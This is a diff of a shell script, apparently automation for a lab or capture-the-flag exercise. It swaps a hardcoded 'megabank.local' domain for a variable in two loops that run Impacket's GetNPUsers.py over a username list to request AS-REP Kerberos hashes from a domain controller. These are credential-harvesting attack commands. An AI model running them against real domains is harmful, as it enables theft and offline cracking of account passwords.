@@ -106,7 +106,7 @@ then
 
 	for i in `cat names.txt`; do
 
-	python $toolkit/GetNPUsers.py megabank.local/$i:$i  -dc-ip $target -request
+	python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
 	done
 
 fi
@@ -140,7 +140,7 @@ sleep 3
 
 for i in `cat names.txt`; do
 
-python $toolkit/GetNPUsers.py megabank.local/$i:$i  -dc-ip $target -request
+python $toolkit/GetNPUsers.py $domain.local/$i:$i  -dc-ip $target -request
 done
 
 echo "====== DONE :)  ===== "
